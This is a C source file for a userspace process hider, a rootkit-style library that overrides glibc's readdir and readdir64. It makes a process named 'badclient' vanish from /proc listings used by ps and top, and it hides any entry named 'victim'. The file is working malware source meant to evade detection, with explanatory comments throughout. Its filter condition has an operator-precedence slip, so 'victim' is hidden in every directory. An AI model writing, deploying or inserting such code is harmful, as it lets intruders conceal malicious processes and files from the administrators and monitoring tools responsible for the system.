/**
 * @file processhider.c
 * @brief Userspace process hider, readdir() wrapper
 *
 * Hooks the standard readdir and readdir64 functions in glibc to intercept directory reading
 * If the directory is /proc and the process name matches the target, it skips returning that
 * entry to the calling program (like ps or top), hiding the process
 *
 */

#define _GNU_SOURCE

#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>

#define BUFF_SIZE 256
#define DIR_NAME_LEN 256
#define PROCSS_NAME_LEN 256

static const char* process_to_filter = "badclient";
static const char* folder_to_filter = "victim";

/**
 * @brief Retrieves the path name of the directory being read
 * 
 * Uses dirfd to get the file descriptor of the directory stream, then reads 
 * the link at /proc/self/fd/ to get the actual directory path
 * 
 * @param dirp Pointer to the directory stream.
 * @param buf  Buffer to store the resulting directory path.
 * @param size The size of the provided buffer.
 * @return 1 on success, 0 if it fails to get the descriptor or read the symlink.
 */
static int get_dir_name(DIR* dirp, char* buf, size_t size)
{
    int fd = dirfd(dirp);
    if(fd == -1) 
    {
        return 0;
    }

    char tmp[BUFF_SIZE];
    // To convert that integer back into a path, 
    // self - redirects to the current process's directory
    snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
    ssize_t ret = readlink(tmp, buf, size);
    if(ret == -1) 
    {
        return 0;
    }

    buf[ret] = 0;
    return 1;
}


/**
 * @brief Extracts the process name from a given PID directory
 * 
 * Verifies the PID string is numeric, then reads the /proc/[pid]/stat file 
 * and parses out the process name located inside
 * 
 * @param pid The process ID string (usually the directory name in /proc).
 * @param buf Buffer to store the extracted process name.
 * @return 1 on success, 0 if the PID is invalid or the stat file cannot be read.
 */
static int get_process_name(char* pid, char* buf)
{
    // Starts at the beginning of the pid string and counts
    // how many characters match the characters in the second string
    // stops counting when it hits a character that isnt in that list
    // if not equal to pid len - chars not from the second string
    if(strspn(pid, "0123456789") != strlen(pid)) 
    {
        return 0;
    }

    char tmp[BUFF_SIZE];
    // Puts the file path string of this pid into tmp
    snprintf(tmp, sizeof(tmp), "/proc/%s/stat", pid);
 
    // File pointer, to read the file
    FILE* f = fopen(tmp, "r");
    if(f == NULL) 
    {
        return 0;
    }

    // Reads first line of text from open file
    // tmp after: 1234 (name) S ...).
    if(fgets(tmp, sizeof(tmp), f) == NULL) 
    {
        fclose(f);
        return 0;
    }

    fclose(f);

    // A place to dump the first piece of data we are about 
    // to parse out of the string, which we dont actually use
    int unused;
    // Ignore ( and read everything until you hit a closing )
    sscanf(tmp, "%d (%[^)]s", &unused, buf); // Captures "name" and puts into buf
    return 1;
}

static struct dirent64 *(*original_readdir64)(DIR *) = NULL;

/**
 * @brief Wrapper for the 64 bit readdir64 function
 * 
 * Resolves the original glibc readdir64() function and wraps it. 
 * It continuously calls the original function, skipping over entries that match 
 * the filtered process name inside /proc, or the "victim" directory
 * 
 * @param dirp Pointer to the directory stream
 * @return A pointer to the next valid dirent64 struct, or NULL at the end of the directory
 */
struct dirent64 *readdir64(DIR *dirp)
{
    if (original_readdir64 == NULL) 
    {
        original_readdir64 = dlsym(RTLD_NEXT, "readdir64"); // Asks the dynamic linker to give the next "readdir64" function after this one
        if (original_readdir64 == NULL) 
        {
            fprintf(stderr, "Error in dlsym: %s\n", dlerror());
            return NULL;
        }
    }

    struct dirent64 *dir;

    while (1) 
    {
        dir = original_readdir64(dirp); // Returns the next struct dirent64*

        if (dir) 
        {
            char dir_name[DIR_NAME_LEN];
            char process_name[PROCSS_NAME_LEN];

            if (get_dir_name(dirp, dir_name, sizeof(dir_name)) &&
                strcmp(dir_name, "/proc") == 0 &&
                get_process_name(dir->d_name, process_name) &&
                strcmp(process_name, process_to_filter) == 0 || !strcmp(dir->d_name, "victim")) 
            {
                continue;
            }
        }

        break;
    }

    return dir;
}

static struct dirent *(*original_readdir)(DIR *) = NULL;

/**
 * @brief Wrapper for the 32 bit readdir function
 * 
 * Resolves the original glibc readdir() function and wraps it. 
 * It continuously calls the original function, skipping over entries that match 
 * the filtered process name inside /proc, or the "victim" directory
 * 
 * @param dirp Pointer to the directory stream
 * @return A pointer to the next valid dirent struct, or NULL at the end of the directory
 */
struct dirent *readdir(DIR *dirp)
{
    if (original_readdir == NULL) 
    {
        original_readdir = dlsym(RTLD_NEXT, "readdir");
        if (original_readdir == NULL) 
        {
            fprintf(stderr, "Error in dlsym: %s\n", dlerror());
            return NULL;
        }
    }

    struct dirent *dir;

    while (1) 
    {
        dir = original_readdir(dirp);

        if (dir) 
        {
            char dir_name[DIR_NAME_LEN];
            char process_name[PROCSS_NAME_LEN];

            if (get_dir_name(dirp, dir_name, sizeof(dir_name)) &&
                strcmp(dir_name, "/proc") == 0 &&
                get_process_name(dir->d_name, process_name) &&
                strcmp(process_name, process_to_filter) == 0 || 
                !strcmp(dir->d_name, folder_to_filter)) // 0 is false so not false
            {
                continue;
            }
        }

        break;
    }

    return dir;
}